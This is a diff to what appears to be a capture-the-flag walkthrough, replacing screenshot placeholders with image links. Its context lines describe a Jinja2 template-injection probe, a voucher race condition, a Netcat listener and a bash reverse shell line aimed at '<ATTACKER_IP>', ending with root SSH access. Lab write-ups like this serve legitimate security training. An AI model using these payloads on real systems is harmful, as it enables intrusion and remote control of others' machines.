@@ -37,7 +37,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 2. Open `http://<TARGET_IP>/checkout` in **two separate browser windows** side by side. In the **Name** field enter the Jinja2 SSTI probe payload `{{7*7}}`, and enter `TRYHACK3M` as the 50% discount voucher code. Submit both windows at the same moment to exploit a **race condition** in the voucher redemption logic. The server validates and marks the voucher as used in two separate, non-atomic operations, so simultaneous requests both pass validation before either is marked as redeemed. On reaching the receipt page, the name field is rendered as **49**, confirming that user input is passed directly into a Jinja2 template without sanitisation.
 
-[SCREEN01]
+<img width="1919" height="711" alt="SCREEN01" src="https://github.com/user-attachments/assets/e2775c50-123e-47a7-bd9a-9b1a19f1959d" />
 
 3. Start a Netcat listener on the attacking machine to receive the reverse shell connection that will be triggered in the next steps.
 
@@ -63,7 +63,7 @@ echo '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
 cat flag.txt
 ```
 
-[SCREEN02]
+<img width="323" height="314" alt="SCREEN02" src="https://github.com/user-attachments/assets/2edc0209-a9d2-4096-bff0-39078f2650ab" />
 
 ---
 
@@ -345,4 +345,4 @@ ssh -i id_rsa root@<TARGET_IP>
 cat a467ea.txt
 ```
 
-[SCREEN03]
+<img width="362" height="85" alt="SCREEN03" src="https://github.com/user-attachments/assets/270c43c0-451b-47c3-b107-030e999cb8bd" />
